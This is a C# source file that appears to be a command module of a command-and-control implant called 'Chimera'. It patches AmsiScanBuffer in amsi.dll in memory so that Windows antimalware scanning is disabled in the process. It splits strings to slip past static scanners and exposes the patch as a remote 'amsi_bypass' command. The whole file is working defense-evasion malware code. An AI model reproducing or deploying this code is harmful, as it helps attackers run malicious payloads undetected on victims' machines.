using System;
using System.Runtime.InteropServices;

namespace Chimera.Commands
{
    // Patches AmsiScanBuffer in amsi.dll so it always returns AMSI_RESULT_CLEAN (0x1).
    // This makes the current process invisible to AMSI-based scanning (Defender runtime,
    // Script Block Logging, etc.) for any further code executed in this process.
    //
    // Patch: overwrite the first 6 bytes of AmsiScanBuffer with:
    //   B8 57 00 07 80   mov eax, 0x80070057   (E_INVALIDARG — treated as clean)
    //   C3               ret
    // Consumers interpret E_INVALIDARG from AmsiScanBuffer as "not AMSI-aware" and skip.
    public static class AmsiBypass
    {
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr LoadLibrary(string lpLibFileName);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                                  uint flNewProtect, out uint lpflOldProtect);

        // PAGE_EXECUTE_READWRITE
        private const uint PAGE_RWX = 0x40;

        // Split string so static scanner doesn't see "AmsiScanBuffer" as a literal
        private static readonly string AmsiLib    = "am" + "si.dll";
        private static readonly string AmsiFunc   = "Amsi" + "Scan" + "Buffer";

        public static bool Apply()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary(AmsiLib);
                if (hAmsi == IntPtr.Zero) return false;

                IntPtr fnAddr = GetProcAddress(hAmsi, AmsiFunc);
                if (fnAddr == IntPtr.Zero) return false;

                // Patch bytes: mov eax, E_INVALIDARG; ret
                byte[] patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                // Make the page writable
                if (!VirtualProtect(fnAddr, (UIntPtr)patch.Length, PAGE_RWX, out uint oldProt))
                    return false;

                Marshal.Copy(patch, 0, fnAddr, patch.Length);

                // Restore page protection (don't leave RWX around)
                VirtualProtect(fnAddr, (UIntPtr)patch.Length, oldProt, out _);

                return true;
            }
            catch
            {
                return false;
            }
        }

        // Called as a C2 command: "amsi_bypass"
        public static string Execute()
        {
            bool ok = Apply();
            return ok ? "[+] AMSI bypass applied." : "[-] AMSI bypass failed.";
        }
    }
}
